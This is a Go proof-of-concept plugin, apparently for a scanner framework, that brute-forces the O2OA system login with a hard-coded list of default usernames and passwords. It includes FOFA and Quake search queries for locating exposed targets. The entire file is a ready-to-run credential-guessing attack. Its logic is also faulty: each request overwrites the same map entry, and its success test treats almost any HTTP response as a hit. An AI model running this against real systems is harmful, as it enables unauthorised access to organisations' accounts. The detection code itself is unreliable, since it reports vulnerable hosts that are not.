package main

import (
	"HwToolslibrary/library/httpclient"
	"HwToolslibrary/library/info"
	"errors"
	"fmt"
	"net/http"
)

var POC info.POC
var Httprecord = make(map[*httpclient.RequestOptions]*httpclient.Response) // 配置请求信息

func init() {
	POC = info.POC{ // 初始化POC信息
		Info: info.POCInfo{
			Name:     "O2系统弱口令漏洞",
			Author:   "ExpLang",
			Describe: "检测O2系统弱口令。",
			Date:     "2023-09-26",
			Tags:     []string{"weak", "o2"},
			Level:    "medium",
			Link:     []string{"https://peiqi.h-k.pw/wiki/oa/O2OA/O2OA%20invoke%20%E5%90%8E%E5%8F%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CNVD-2020-18740.html", "https://peiqi.h-k.pw/wiki/oa/O2OA/O2OA%20open%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.html"},
		},
		Other: info.OtherInfo{
			FOFAGrammar:  "title==\"O2OA\"",
			QuakeGrammar: "title: \"O2OA\"",
		},
	}
}

func Start(Target string, ProxyURL string) (bool, error) {
	// Define the list of users and passwords
	users := []string{"admin", "o2", "test", "demo"}
	passwords := []string{"o2", "o2oa@2022", "o2oa@2023", "o2oa@2021", "123456", "123321", "123qwe321", "test", "12345", "demo", "admin"}

	// Define the base request options
	requestOption := &httpclient.RequestOptions{
		Method: http.MethodPost,
		URL:    Target + "/x_organization_assemble_authentication/jaxrs/authentication/captcha?v=7.0&lmzpnggj",
		Headers: map[string]string{
			"User-Agent": httpclient.RandomUserAgent(),
		},
		ProxyURL: ProxyURL,
	}

	// Loop through users and passwords
	for _, user := range users {
		for _, password := range passwords {
			requestBody := fmt.Sprintf(`{"credential":"%s","password":"%s"}`, user, password)
			requestOption.RequestBody = []byte(requestBody)

			// Send the request
			responseOption, success := httpclient.SendRequest(*requestOption)
			Httprecord[requestOption] = responseOption

			if responseOption.Err != nil {
				// 处理错误
				return false, responseOption.Err
			} else {
				if !success {
					// 发送请求失败
					return false, errors.New("请求失败")
				}
			}
		}
	}

	POC.Info.HttpInfo = Httprecord

	for _, responseOption := range Httprecord {
		statusCode := responseOption.StatusCode
		if statusCode == 500 || statusCode == 302 || statusCode == 200 || statusCode == 301 {
			return true, nil
		}
	}
	return false, nil
}
